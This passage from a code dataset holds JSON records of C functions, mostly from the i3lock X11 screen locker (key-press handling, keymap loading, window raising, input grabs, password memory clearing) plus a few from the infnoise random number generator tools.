STATE_I3LOCK_LOCK_FAILED:\n                text = \"Lock failed!\";\n                break;\n            default:\n                if (unlock_state == STATE_NOTHING_TO_DELETE) {\n                    text = \"No input\";\n                }\n                if (show_failed_attempts && failed_attempts > 0) {\n                    if (failed_attempts > 999) {\n                        text = \"> 999\";\n                    } else {\n                        snprintf(buf, sizeof(buf), \"%d\", failed_attempts);\n                        text = buf;\n                    }\n                    cairo_set_source_rgb(ctx, 1, 0, 0);\n                    cairo_set_font_size(ctx, 32.0);\n                }\n                break;\n        }\n\n        if (text) {\n            cairo_text_extents_t extents;\n            double x, y;\n\n            cairo_text_extents(ctx, text, &extents);\n            x = BUTTON_CENTER - ((extents.width / 2) + extents.x_bearing);\n            y = BUTTON_CENTER - ((extents.height / 2) + extents.y_bearing);\n\n            cairo_move_to(ctx, x, y);\n            cairo_show_text(ctx, text);\n            cairo_close_path(ctx);\n        }\n\n        if (auth_state == STATE_AUTH_WRONG && (modifier_string != NULL)) {\n            cairo_text_extents_t extents;\n            double x, y;\n\n            cairo_set_font_size(ctx, 14.0);\n\n            cairo_text_extents(ctx, modifier_string, &extents);\n            x = BUTTON_CENTER - ((extents.width / 2) + extents.x_bearing);\n            y = BUTTON_CENTER - ((extents.height / 2) + extents.y_bearing) + 28.0;\n\n            cairo_move_to(ctx, x, y);\n            cairo_show_text(ctx, modifier_string);\n            cairo_close_path(ctx);\n        }\n\n        /* After the user pressed any valid key or the backspace key, we\n         * highlight a random part of the unlock indicator to confirm this\n         * keypress. */\n        if (unlock_state == STATE_KEY_ACTIVE ||\n            unlock_state == STATE_BACKSPACE_ACTIVE) {\n            cairo_new_sub_path(ctx);\n            double highlight_start = (rand() % (int)(2 * M_PI * 100)) / 100.0;\n            cairo_arc(ctx,\n                      BUTTON_CENTER /* x */,\n                      BUTTON_CENTER /* y */,\n                      BUTTON_RADIUS /* radius */,\n                      highlight_start,\n                      highlight_start + (M_PI / 3.0));\n            if (unlock_state == STATE_KEY_ACTIVE) {\n                /* For normal keys, we use a lighter green. */\n                cairo_set_source_rgb(ctx, 51.0 / 255, 219.0 / 255, 0);\n            } else {\n                /* For backspace, we use red. */\n                cairo_set_source_rgb(ctx, 219.0 / 255, 51.0 / 255, 0);\n            }\n            cairo_stroke(ctx);\n\n            /* Draw two little separators for the highlighted part of the\n             * unlock indicator. */\n            cairo_set_source_rgb(ctx, 0, 0, 0);\n            cairo_arc(ctx,\n                      BUTTON_CENTER /* x */,\n                      BUTTON_CENTER /* y */,\n                      BUTTON_RADIUS /* radius */,\n                      highlight_start /* start */,\n                      highlight_start + (M_PI / 128.0) /* end */);\n            cairo_stroke(ctx);\n            cairo_arc(ctx,\n                      BUTTON_CENTER /* x */,\n                      BUTTON_CENTER /* y */,\n                      BUTTON_RADIUS /* radius */,\n                      (highlight_start + (M_PI / 3.0)) - (M_PI / 128.0) /* start */,\n                      highlight_start + (M_PI / 3.0) /* end */);\n            cairo_stroke(ctx);\n        }\n    }\n\n    if (xr_screens > 0) {\n        /* Composite the unlock indicator in the middle of each screen. */\n        for (int screen = 0; screen < xr_screens; screen++) {\n            int x = (xr_resolutions[screen].x + ((xr_resolutions[screen].width / 2) - (button_diameter_physical / 2)));\n            int y = (xr_resolutions[screen].y + ((xr_resolutions[screen].height / 2) - (button_diameter_physical / 2)));\n            cairo_set_source_surface(xcb_ctx, output, x, y);\n            cairo_rectangle(xcb_ctx, x, y, button_diameter_physical, button_diameter_physical);\n            cairo_fill(xcb_ctx);\n        }\n    } else {\n        /* We have no information about the screen sizes/positions, so we just\n         * place the unlock indicator in the middle of the X root window and\n         * hope for the best. */\n        int x = (last_resolution[0] / 2) - (button_diameter_physical / 2);\n        int y = (last_resolution[1] / 2) - (button_diameter_physical / 2);\n        cairo_set_source_surface(xcb_ctx, output, x, y);\n        cairo_rectangle(xcb_ctx, x, y, button_diameter_physical, button_diameter_physical);\n        cairo_fill(xcb_ctx);\n    }\n\n    cairo_surface_destroy(xcb_output);\n    cairo_surface_destroy(output);\n    cairo_destroy(ctx);\n    cairo_destroy(xcb_ctx);\n}", "path": "i3lock/unlock_indicator.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "/*\n * A visibility notify event will be received when the visibility (= can the\n * user view the complete window) changes, so for example when a popup overlays\n * some area of the i3lock window.\n *\n * In this case, we raise our window on top so that the popup (or whatever is\n * hiding us) gets hidden.\n *\n */\n", "func_signal": "static void handle_visibility_notify(xcb_connection_t *conn,\n                                     xcb_visibility_notify_event_t *event)", "code": "{\n    if (event->state != XCB_VISIBILITY_UNOBSCURED) {\n        uint32_t values[] = {XCB_STACK_MODE_ABOVE};\n        xcb_configure_window(conn, event->window, XCB_CONFIG_WINDOW_STACK_MODE, values);\n        xcb_flush(conn);\n    }\n}", "path": "i3lock/i3lock.c", "commit_date": "2020-10-02 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "/*\n * Instead of polling the X connection socket we leave this to\n * xcb_poll_for_event() which knows better than we can ever know.\n *\n */\n", "func_signal": "static void xcb_check_cb(EV_P_ ev_check *w, int revents)", "code": "{\n    xcb_generic_event_t *event;\n\n    if (xcb_connection_has_error(conn))\n        errx(EXIT_FAILURE, \"X11 connection broke, did your server terminate?\");\n\n    while ((event = xcb_poll_for_event(conn)) != NULL) {\n        if (event->response_type == 0) {\n            xcb_generic_error_t *error = (xcb_generic_error_t *)event;\n            if (debug_mode)\n                fprintf(stderr, \"X11 Error received! sequence 0x%x, error_code = %d\\n\",\n                        error->sequence, error->error_code);\n            free(event);\n            continue;\n        }\n\n        /* Strip off the highest bit (set if the event is generated) */\n        int type = (event->response_type & 0x7F);\n\n        switch (type) {\n            case XCB_KEY_PRESS:\n                handle_key_press((xcb_key_press_event_t *)event);\n                break;\n\n            case XCB_VISIBILITY_NOTIFY:\n                handle_visibility_notify(conn, (xcb_visibility_notify_event_t *)event);\n                break;\n\n            case XCB_MAP_NOTIFY:\n                maybe_close_sleep_lock_fd();\n                if (!dont_fork) {\n                    /* After the first MapNotify, we never fork again. We don\u2019t\n                     * expect to get another MapNotify, but better be sure\u2026 */\n                    dont_fork = true;\n\n                    /* In the parent process, we exit */\n                    if (fork() != 0)\n                        exit(0);\n\n                    ev_loop_fork(EV_DEFAULT);\n                }\n                break;\n\n            case XCB_CONFIGURE_NOTIFY:\n                handle_screen_resize();\n                break;\n\n            default:\n                if (type == xkb_base_event) {\n                    process_xkb_event(event);\n                }\n                if (randr_base > -1 &&\n                    type == randr_base + XCB_RANDR_SCREEN_CHANGE_NOTIFY) {\n                    randr_query(screen->root);\n                    handle_screen_resize();\n                }\n        }\n\n        free(event);\n    }\n}", "path": "i3lock/i3lock.c", "commit_date": "2020-10-02 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "/*\n * Handle key presses. Fixes state, then looks up the key symbol for the\n * given keycode, then looks up the key symbol (as UCS-2), converts it to\n * UTF-8 and stores it in the password array.\n *\n */\n", "func_signal": "static void handle_key_press(xcb_key_press_event_t *event)", "code": "{\n    xkb_keysym_t ksym;\n    char buffer[128];\n    int n;\n    bool ctrl;\n    bool composed = false;\n\n    ksym = xkb_state_key_get_one_sym(xkb_state, event->detail);\n    ctrl = xkb_state_mod_name_is_active(xkb_state, XKB_MOD_NAME_CTRL, XKB_STATE_MODS_DEPRESSED);\n\n    /* The buffer will be null-terminated, so n >= 2 for 1 actual character. */\n    memset(buffer, '\\0', sizeof(buffer));\n\n    if (xkb_compose_state && xkb_compose_state_feed(xkb_compose_state, ksym) == XKB_COMPOSE_FEED_ACCEPTED) {\n        switch (xkb_compose_state_get_status(xkb_compose_state)) {\n            case XKB_COMPOSE_NOTHING:\n                break;\n            case XKB_COMPOSE_COMPOSING:\n                return;\n            case XKB_COMPOSE_COMPOSED:\n                /* xkb_compose_state_get_utf8 doesn't include the terminating byte in the return value\n             * as xkb_keysym_to_utf8 does. Adding one makes the variable n consistent. */\n                n = xkb_compose_state_get_utf8(xkb_compose_state, buffer, sizeof(buffer)) + 1;\n                ksym = xkb_compose_state_get_one_sym(xkb_compose_state);\n                composed = true;\n                break;\n            case XKB_COMPOSE_CANCELLED:\n                xkb_compose_state_reset(xkb_compose_state);\n                return;\n        }\n    }\n\n    if (!composed) {\n        n = xkb_keysym_to_utf8(ksym, buffer, sizeof(buffer));\n    }\n\n    switch (ksym) {\n        case XKB_KEY_j:\n        case XKB_KEY_m:\n        case XKB_KEY_Return:\n        case XKB_KEY_KP_Enter:\n        case XKB_KEY_XF86ScreenSaver:\n            if ((ksym == XKB_KEY_j || ksym == XKB_KEY_m) && !ctrl)\n                break;\n\n            if (auth_state == STATE_AUTH_WRONG) {\n                retry_verification = true;\n                return;\n            }\n\n            if (skip_without_validation()) {\n                clear_input();\n                return;\n            }\n            finish_input();\n            skip_repeated_empty_password = true;\n            return;\n        default:\n            skip_repeated_empty_password = false;\n            // A new password is being entered, but a previous one is pending.\n            // Discard the old one and clear the retry_verification flag.\n            if (retry_verification) {\n                retry_verification = false;\n                clear_input();\n            }\n    }\n\n    switch (ksym) {\n        case XKB_KEY_u:\n        case XKB_KEY_Escape:\n            if ((ksym == XKB_KEY_u && ctrl) ||\n                ksym == XKB_KEY_Escape) {\n                DEBUG(\"C-u pressed\\n\");\n                clear_input();\n                /* Also hide the unlock indicator */\n                if (unlock_indicator)\n                    clear_indicator();\n                return;\n            }\n            break;\n\n        case XKB_KEY_Delete:\n        case XKB_KEY_KP_Delete:\n            /* Deleting forward doesn\u2019t make sense, as i3lock doesn\u2019t allow you\n             * to move the cursor when entering a password. We need to eat this\n             * key press so that it won\u2019t be treated as part of the password,\n             * see issue #50. */\n            return;\n\n        case XKB_KEY_h:\n        case XKB_KEY_BackSpace:\n            if (ksym == XKB_KEY_h && !ctrl)\n                break;\n\n            if (input_position == 0) {\n                START_TIMER(clear_indicator_timeout, 1.0, clear_indicator_cb);\n                unlock_state = STATE_NOTHING_TO_DELETE;\n                redraw_screen();\n                return;\n            }\n\n            /* decrement input_position to point to the previous glyph */\n            u8_dec(password, &input_position);\n            password[input_position] = '\\0';\n\n            /* Hide the unlock indicator after a bit if the password buffer is\n             * empty. */\n            START_TIMER(clear_indicator_timeout, 1.0, clear_indicator_cb);\n            unlock_state = STATE_BACKSPACE_ACTIVE;\n            redraw_screen();\n            unlock_state = STATE_KEY_PRESSED;\n            return;\n    }\n\n    if ((input_position + 8) >= (int)sizeof(password))\n        return;\n\n#if 0\n    /* FIXME: handle all of these? */\n    printf(\"is_keypad_key = %d\\n\", xcb_is_keypad_key(sym));\n    printf(\"is_private_keypad_key = %d\\n\", xcb_is_private_keypad_key(sym));\n    printf(\"xcb_is_cursor_key = %d\\n\", xcb_is_cursor_key(sym));\n    printf(\"xcb_is_pf_key = %d\\n\", xcb_is_pf_key(sym));\n    printf(\"xcb_is_function_key = %d\\n\", xcb_is_function_key(sym));\n    printf(\"xcb_is_misc_function_key = %d\\n\", xcb_is_misc_function_key(sym));\n    printf(\"xcb_is_modifier_key = %d\\n\", xcb_is_modifier_key(sym));\n#endif\n\n    if (n < 2)\n        return;\n\n    /* store it in the password array as UTF-8 */\n    memcpy(password + input_position, buffer, n - 1);\n    input_position += n - 1;\n    DEBUG(\"current password = %.*s\\n\", input_position, password);\n\n    if (unlock_indicator) {\n        unlock_state = STATE_KEY_ACTIVE;\n        redraw_screen();\n        unlock_state = STATE_KEY_PRESSED;\n\n        struct ev_timer *timeout = NULL;\n        START_TIMER(timeout, TSTAMP_N_SECS(0.25), redraw_timeout);\n        STOP_TIMER(clear_indicator_timeout);\n    }\n\n    START_TIMER(discard_passwd_timeout, TSTAMP_N_MINS(3), discard_passwd_cb);\n}", "path": "i3lock/i3lock.c", "commit_date": "2020-10-02 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "/*\n * Loads the XKB keymap from the X11 server and feeds it to xkbcommon.\n * Necessary so that we can properly let xkbcommon track the keyboard state and\n * translate keypresses to utf-8.\n *\n */\n", "func_signal": "static bool load_keymap(void)", "code": "{\n    if (xkb_context == NULL) {\n        if ((xkb_context = xkb_context_new(0)) == NULL) {\n            fprintf(stderr, \"[i3lock] could not create xkbcommon context\\n\");\n            return false;\n        }\n    }\n\n    xkb_keymap_unref(xkb_keymap);\n\n    int32_t device_id = xkb_x11_get_core_keyboard_device_id(conn);\n    DEBUG(\"device = %d\\n\", device_id);\n    if ((xkb_keymap = xkb_x11_keymap_new_from_device(xkb_context, conn, device_id, 0)) == NULL) {\n        fprintf(stderr, \"[i3lock] xkb_x11_keymap_new_from_device failed\\n\");\n        return false;\n    }\n\n    struct xkb_state *new_state =\n        xkb_x11_state_new_from_device(xkb_keymap, conn, device_id);\n    if (new_state == NULL) {\n        fprintf(stderr, \"[i3lock] xkb_x11_state_new_from_device failed\\n\");\n        return false;\n    }\n\n    xkb_state_unref(xkb_state);\n    xkb_state = new_state;\n\n    return true;\n}", "path": "i3lock/i3lock.c", "commit_date": "2020-10-02 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "/*\n * Loads the XKB compose table from the given locale.\n *\n */\n", "func_signal": "static bool load_compose_table(const char *locale)", "code": "{\n    xkb_compose_table_unref(xkb_compose_table);\n\n    if ((xkb_compose_table = xkb_compose_table_new_from_locale(xkb_context, locale, 0)) == NULL) {\n        fprintf(stderr, \"[i3lock] xkb_compose_table_new_from_locale failed\\n\");\n        return false;\n    }\n\n    struct xkb_compose_state *new_compose_state = xkb_compose_state_new(xkb_compose_table, 0);\n    if (new_compose_state == NULL) {\n        fprintf(stderr, \"[i3lock] xkb_compose_state_new failed\\n\");\n        return false;\n    }\n\n    xkb_compose_state_unref(xkb_compose_state);\n    xkb_compose_state = new_compose_state;\n\n    return true;\n}", "path": "i3lock/i3lock.c", "commit_date": "2020-10-02 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "/*\n * Try closing logind sleep lock fd passed over from xss-lock, in case we're\n * being run from there.\n *\n */\n", "func_signal": "static void maybe_close_sleep_lock_fd(void)", "code": "{\n    const char *sleep_lock_fd = getenv(\"XSS_SLEEP_LOCK_FD\");\n    char *endptr;\n    if (sleep_lock_fd && *sleep_lock_fd != 0) {\n        long int fd = strtol(sleep_lock_fd, &endptr, 10);\n        if (*endptr == 0) {\n            close(fd);\n        }\n    }\n}", "path": "i3lock/i3lock.c", "commit_date": "2020-10-02 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "/*\n * Calls draw_image on a new pixmap and swaps that with the current pixmap\n *\n */\n", "func_signal": "void redraw_screen(void)", "code": "{\n    DEBUG(\"redraw_screen(unlock_state = %d, auth_state = %d)\\n\", unlock_state, auth_state);\n    if (bg_pixmap == XCB_NONE) {\n        DEBUG(\"allocating pixmap for %d x %d px\\n\", last_resolution[0], last_resolution[1]);\n        bg_pixmap = create_bg_pixmap(conn, screen, last_resolution, color);\n    }\n\n    draw_image(bg_pixmap, last_resolution);\n    xcb_change_window_attributes(conn, win, XCB_CW_BACK_PIXMAP, (uint32_t[1]){bg_pixmap});\n    /* XXX: Possible optimization: Only update the area in the middle of the\n     * screen instead of the whole screen. */\n    xcb_clear_area(conn, 0, win, 0, 0, last_resolution[0], last_resolution[1]);\n    xcb_flush(conn);\n}", "path": "i3lock/unlock_indicator.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "/*\n * Neccessary calls after ending input via enter or others\n *\n */\n", "func_signal": "static void finish_input(void)", "code": "{\n    password[input_position] = '\\0';\n    unlock_state = STATE_KEY_PRESSED;\n    redraw_screen();\n    input_done();\n}", "path": "i3lock/i3lock.c", "commit_date": "2020-10-02 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "/*\n * Called when the keyboard mapping changes. We update our symbols.\n *\n * We ignore errors \u2014 if the new keymap cannot be loaded it\u2019s better if the\n * screen stays locked and the user intervenes by using killall i3lock.\n *\n */\n", "func_signal": "static void process_xkb_event(xcb_generic_event_t *gevent)", "code": "{\n    union xkb_event {\n        struct {\n            uint8_t response_type;\n            uint8_t xkbType;\n            uint16_t sequence;\n            xcb_timestamp_t time;\n            uint8_t deviceID;\n        } any;\n        xcb_xkb_new_keyboard_notify_event_t new_keyboard_notify;\n        xcb_xkb_map_notify_event_t map_notify;\n        xcb_xkb_state_notify_event_t state_notify;\n    } *event = (union xkb_event *)gevent;\n\n    DEBUG(\"process_xkb_event for device %d\\n\", event->any.deviceID);\n\n    if (event->any.deviceID != xkb_x11_get_core_keyboard_device_id(conn))\n        return;\n\n    /*\n     * XkbNewKkdNotify and XkbMapNotify together capture all sorts of keymap\n     * updates (e.g. xmodmap, xkbcomp, setxkbmap), with minimal redundent\n     * recompilations.\n     */\n    switch (event->any.xkbType) {\n        case XCB_XKB_NEW_KEYBOARD_NOTIFY:\n            if (event->new_keyboard_notify.changed & XCB_XKB_NKN_DETAIL_KEYCODES)\n                (void)load_keymap();\n            break;\n\n        case XCB_XKB_MAP_NOTIFY:\n            (void)load_keymap();\n            break;\n\n        case XCB_XKB_STATE_NOTIFY:\n            xkb_state_update_mask(xkb_state,\n                                  event->state_notify.baseMods,\n                                  event->state_notify.latchedMods,\n                                  event->state_notify.lockedMods,\n                                  event->state_notify.baseGroup,\n                                  event->state_notify.latchedGroup,\n                                  event->state_notify.lockedGroup);\n            break;\n    }\n}", "path": "i3lock/i3lock.c", "commit_date": "2020-10-02 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "/*\n * Clears the memory which stored the password to be a bit safer against\n * cold-boot attacks.\n *\n */\n", "func_signal": "static void clear_password_memory(void)", "code": "{\n#ifdef HAVE_EXPLICIT_BZERO\n    /* Use explicit_bzero(3) which was explicitly designed not to be\n     * optimized out by the compiler. */\n    explicit_bzero(password, strlen(password));\n#else\n    /* A volatile pointer to the password buffer to prevent the compiler from\n     * optimizing this out. */\n    volatile char *vpassword = password;\n    for (size_t c = 0; c < sizeof(password); c++)\n        /* We store a non-random pattern which consists of the (irrelevant)\n         * index plus (!) the value of the beep variable. This prevents the\n         * compiler from optimizing the calls away, since the value of 'beep'\n         * is not known at compile-time. */\n        vpassword[c] = c + (int)beep;\n#endif\n}", "path": "i3lock/i3lock.c", "commit_date": "2020-10-02 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "/*\n * Initialize the DPI setting.\n * This will use the 'Xft.dpi' X resource if available and fall back to\n * guessing the correct value otherwise.\n */\n", "func_signal": "void init_dpi(void)", "code": "{\n    xcb_xrm_database_t *database = NULL;\n    char *resource = NULL;\n\n    if (conn == NULL) {\n        goto init_dpi_end;\n    }\n\n    database = xcb_xrm_database_from_default(conn);\n    if (database == NULL) {\n        DEBUG(\"Failed to open the resource database.\\n\");\n        goto init_dpi_end;\n    }\n\n    xcb_xrm_resource_get_string(database, \"Xft.dpi\", NULL, &resource);\n    if (resource == NULL) {\n        DEBUG(\"Resource Xft.dpi not specified, skipping.\\n\");\n        goto init_dpi_end;\n    }\n\n    char *endptr;\n    double in_dpi = strtod(resource, &endptr);\n    if (in_dpi == HUGE_VAL || dpi < 0 || *endptr != '\\0' || endptr == resource) {\n        DEBUG(\"Xft.dpi = %s is an invalid number and couldn't be parsed.\\n\", resource);\n        dpi = 0;\n        goto init_dpi_end;\n    }\n    dpi = (long)round(in_dpi);\n\n    DEBUG(\"Found Xft.dpi = %ld.\\n\", dpi);\n\ninit_dpi_end:\n    if (resource != NULL) {\n        free(resource);\n    }\n\n    if (database != NULL) {\n        xcb_xrm_database_free(database);\n    }\n\n    if (dpi == 0) {\n        DEBUG(\"Using fallback for calculating DPI.\\n\");\n        dpi = init_dpi_fallback();\n        DEBUG(\"Using dpi = %ld\\n\", dpi);\n    }\n}", "path": "i3lock/dpi.c", "commit_date": "2018-05-11 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "/*\n * Repeatedly tries to grab pointer and keyboard (up to the specified number of\n * tries).\n *\n * Returns true if the grab succeeded, false if not.\n *\n */\n", "func_signal": "bool grab_pointer_and_keyboard(xcb_connection_t *conn, xcb_screen_t *screen, xcb_cursor_t cursor, int tries)", "code": "{\n    xcb_grab_pointer_cookie_t pcookie;\n    xcb_grab_pointer_reply_t *preply;\n\n    xcb_grab_keyboard_cookie_t kcookie;\n    xcb_grab_keyboard_reply_t *kreply;\n\n    const suseconds_t screen_redraw_timeout = 100000; /* 100ms */\n\n    /* Using few variables to trigger a redraw_screen() if too many tries */\n    bool redrawn = false;\n    struct timeval start;\n    if (gettimeofday(&start, NULL) == -1) {\n        err(EXIT_FAILURE, \"gettimeofday\");\n    }\n\n    while (tries-- > 0) {\n        pcookie = xcb_grab_pointer(\n            conn,\n            false,               /* get all pointer events specified by the following mask */\n            screen->root,        /* grab the root window */\n            XCB_NONE,            /* which events to let through */\n            XCB_GRAB_MODE_ASYNC, /* pointer events should continue as normal */\n            XCB_GRAB_MODE_ASYNC, /* keyboard mode */\n            XCB_NONE,            /* confine_to = in which window should the cursor stay */\n            cursor,              /* we change the cursor to whatever the user wanted */\n            XCB_CURRENT_TIME);\n\n        if ((preply = xcb_grab_pointer_reply(conn, pcookie, NULL)) &&\n            preply->status == XCB_GRAB_STATUS_SUCCESS) {\n            free(preply);\n            break;\n        }\n\n        /* In case the grab failed, we still need to free the reply */\n        free(preply);\n\n        /* Make this quite a bit slower */\n        usleep(50);\n\n        struct timeval now;\n        if (gettimeofday(&now, NULL) == -1) {\n            err(EXIT_FAILURE, \"gettimeofday\");\n        }\n\n        struct timeval elapsed;\n        timersub(&now, &start, &elapsed);\n\n        if (!redrawn &&\n            (tries % 100) == 0 &&\n            elapsed.tv_usec >= screen_redraw_timeout) {\n            redraw_screen();\n            redrawn = true;\n        }\n    }\n\n    while (tries-- > 0) {\n        kcookie = xcb_grab_keyboard(\n            conn,\n            true,         /* report events */\n            screen->root, /* grab the root window */\n            XCB_CURRENT_TIME,\n            XCB_GRAB_MODE_ASYNC, /* process events as normal, do not require sync */\n            XCB_GRAB_MODE_ASYNC);\n\n        if ((kreply = xcb_grab_keyboard_reply(conn, kcookie, NULL)) &&\n            kreply->status == XCB_GRAB_STATUS_SUCCESS) {\n            free(kreply);\n            break;\n        }\n\n        /* In case the grab failed, we still need to free the reply */\n        free(kreply);\n\n        /* Make this quite a bit slower */\n        usleep(50);\n\n        struct timeval now;\n        if (gettimeofday(&now, NULL) == -1) {\n            err(EXIT_FAILURE, \"gettimeofday\");\n        }\n\n        struct timeval elapsed;\n        timersub(&now, &start, &elapsed);\n\n        /* Trigger a screen redraw if 100ms elapsed */\n        if (!redrawn &&\n            (tries % 100) == 0 &&\n            elapsed.tv_usec >= screen_redraw_timeout) {\n            redraw_screen();\n            redrawn = true;\n        }\n    }\n\n    return (tries > 0);\n}", "path": "i3lock/xcb.c", "commit_date": "2020-01-20 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "/*\n * This function is called from a fork()ed child and will raise the i3lock\n * window when the window is obscured, even when the main i3lock process is\n * blocked due to the authentication backend.\n *\n */\n", "func_signal": "static void raise_loop(xcb_window_t window)", "code": "{\n    xcb_connection_t *conn;\n    xcb_generic_event_t *event;\n    int screens;\n\n    if (xcb_connection_has_error((conn = xcb_connect(NULL, &screens))) > 0)\n        errx(EXIT_FAILURE, \"Cannot open display\");\n\n    /* We need to know about the window being obscured or getting destroyed. */\n    xcb_change_window_attributes(conn, window, XCB_CW_EVENT_MASK,\n                                 (uint32_t[]){\n                                     XCB_EVENT_MASK_VISIBILITY_CHANGE |\n                                     XCB_EVENT_MASK_STRUCTURE_NOTIFY});\n    xcb_flush(conn);\n\n    DEBUG(\"Watching window 0x%08x\\n\", window);\n    while ((event = xcb_wait_for_event(conn)) != NULL) {\n        if (event->response_type == 0) {\n            xcb_generic_error_t *error = (xcb_generic_error_t *)event;\n            DEBUG(\"X11 Error received! sequence 0x%x, error_code = %d\\n\",\n                  error->sequence, error->error_code);\n            free(event);\n            continue;\n        }\n        /* Strip off the highest bit (set if the event is generated) */\n        int type = (event->response_type & 0x7F);\n        DEBUG(\"Read event of type %d\\n\", type);\n        switch (type) {\n            case XCB_VISIBILITY_NOTIFY:\n                handle_visibility_notify(conn, (xcb_visibility_notify_event_t *)event);\n                break;\n            case XCB_UNMAP_NOTIFY:\n                DEBUG(\"UnmapNotify for 0x%08x\\n\", (((xcb_unmap_notify_event_t *)event)->window));\n                if (((xcb_unmap_notify_event_t *)event)->window == window)\n                    exit(EXIT_SUCCESS);\n                break;\n            case XCB_DESTROY_NOTIFY:\n                DEBUG(\"DestroyNotify for 0x%08x\\n\", (((xcb_destroy_notify_event_t *)event)->window));\n                if (((xcb_destroy_notify_event_t *)event)->window == window)\n                    exit(EXIT_SUCCESS);\n                break;\n            default:\n                DEBUG(\"Unhandled event type %d\\n\", type);\n                break;\n        }\n        free(event);\n    }\n}", "path": "i3lock/i3lock.c", "commit_date": "2020-10-02 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "/*\n * Called when the properties on the root window change, e.g. when the screen\n * resolution changes. If so we update the window to cover the whole screen\n * and also redraw the image, if any.\n *\n */\n", "func_signal": "static void handle_screen_resize(void)", "code": "{\n    xcb_get_geometry_cookie_t geomc;\n    xcb_get_geometry_reply_t *geom;\n    geomc = xcb_get_geometry(conn, screen->root);\n    if ((geom = xcb_get_geometry_reply(conn, geomc, 0)) == NULL)\n        return;\n\n    if (last_resolution[0] == geom->width &&\n        last_resolution[1] == geom->height) {\n        free(geom);\n        return;\n    }\n\n    last_resolution[0] = geom->width;\n    last_resolution[1] = geom->height;\n\n    free(geom);\n\n    redraw_screen();\n\n    uint32_t mask = XCB_CONFIG_WINDOW_WIDTH | XCB_CONFIG_WINDOW_HEIGHT;\n    xcb_configure_window(conn, win, mask, last_resolution);\n    xcb_flush(conn);\n\n    randr_query(screen->root);\n    redraw_screen();\n}", "path": "i3lock/i3lock.c", "commit_date": "2020-10-02 00:00:00", "repo_name": "i3/i3lock", "stars": 872, "license": "bsd-3-clause", "language": "c", "size": 407}
{"docstring": "// Convert an address value 0 to 15 to an 8-bit value using ADDR0 .. ADDR3.\n", "func_signal": "static uint8_t makeAddress(uint8_t addr)", "code": "{\n    uint8_t value = 0;\n    if(addr & 1) {\n        value |= 1 << ADDR0;\n    }\n    if(addr & 2) {\n        value |= 1 << ADDR1;\n    }\n    if(addr & 4) {\n        value |= 1 << ADDR2;\n    }\n    if(addr & 8) {\n        value |= 1 << ADDR3;\n    }\n    return value;\n}", "path": "infnoise/software/infnoise_win.c", "commit_date": "2019-07-07 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
{"docstring": "// Return the difference in the times as a double in microseconds.\n", "func_signal": "static double diffTime(struct timespec *start, struct timespec *end)", "code": "{\n    uint32_t seconds = end->tv_sec - start->tv_sec;\n    int32_t nanoseconds = end->tv_nsec - start->tv_nsec;\n    return seconds*1e6 + nanoseconds/1000.0;\n}", "path": "infnoise/software/infnoise_win.c", "commit_date": "2019-07-07 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
{"docstring": "// Reset the statistics.\n", "func_signal": "static void resetStats(void)", "code": "{\n    inmNumBitsSampled = 0u;\n    inmCurrentProbability = 1.0;\n    inmNumBitsOfEntropy = 0u;\n    inmTotalOnes = 0u;\n    inmTotalZeros = 0u;\n}", "path": "infnoise/software/tools/entcheck.c", "commit_date": "2016-06-29 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
{"docstring": "// Print usage and exit\n", "func_signal": "static void usage(void)", "code": "{\n    fprintf(stderr, \"Usage: entcheck [options]\\n\"\n           \"    -N numBits    -- Use N previous bits to predict the next bit\\n\"\n           \"    -s numStreams -- Use s streams to predict the next bit\\n\"\n           \"\\n\"\n           \"entcheck simply uses the previous N bits (16 by default) to predict the next bit.\\n\"\n           \"It estimates the entropy based on 'surprise', or log2 of the probability of seeing\\n\"\n           \"the string of 0's and 1's.  Sometimes some bits are special, such as the output of\\n\"\n           \"an 8 bit DAC, where we want different tables depending on which bit we're predicting.\\n\"\n           \"Set numStreams to the DAC width in this case.\\n\");\n    exit(1);\n}", "path": "infnoise/software/tools/entcheck.c", "commit_date": "2016-06-29 00:00:00", "repo_name": "waywardgeek/infnoise", "stars": 696, "license": "cc0-1.0", "language": "c", "size": 68270}
